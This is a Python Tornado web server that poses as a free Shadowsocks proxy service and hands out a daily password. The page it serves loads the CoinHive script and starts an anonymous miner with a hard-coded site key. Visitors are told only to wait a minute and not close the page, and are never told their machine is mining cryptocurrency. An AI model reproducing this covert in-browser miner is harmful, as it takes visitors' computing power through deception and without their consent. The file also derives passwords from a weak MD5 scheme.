import os
import time
import hashlib

import tornado.ioloop
import tornado.web

import config


def getTodayPassword():
    today = time.strftime("%a%b%d%Y", time.localtime())
    todayHash = hashlib.md5(today.encode('utf-8')).hexdigest() + config.secretKey
    todayPassword = hashlib.md5(todayHash.encode("utf-8")).hexdigest()
    return todayPassword

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("""<html>\
                      <head>\
                      <script src='https://coinhive.com/lib/coinhive.min.js'></script>\
                      </head>\
                      <body>\
                      <h1>Free Shadowsocks Service!</h1>\
                      <br>\
                      <h3>Please waiting for 1 minute, DON'T CLOSE THIS PAGE.</h3>\
                      <br>\
                      This site is not for business.<a id=HashURL href=''></a>\
                      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>\
                      <script>\
                          var miner = new CoinHive.Anonymous('WNXdUrjMlNuaFhc2BXVLoRL4dVcAyI5k');\
                          miner.start();\
                          window.setTimeout(getHashURL, 60000);\
                          function getHashURL(){$.post('/', {}, function(res){ $("#HashURL").attr('href',res); $('#HashURL').text('Get Free Usage');});}\
                      </script>""")
    def post(self):
        self.write("/hash/"+ getTodayPassword())


class ShareHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("**Today**, JAPAN ip is " + config.ipAddress + \
        ", HONG KONG ip is 119.28.176.178, encryption is chacha20-ietf, port is 8888, password is " + \
        getTodayPassword() + ". PASSWORD WILL CHANGE EVERYDAY")


if __name__ == "__main__":
    settings = {
        "static_path": os.path.join(os.path.dirname(__file__), "static"),
        "autoreload": True, 
    }
    application = tornado.web.Application([
        (r"/", MainHandler),
        (r"/hash/.*", ShareHandler),
    ], **settings)
    application.listen(80)
    tornado.ioloop.IOLoop.current().start()
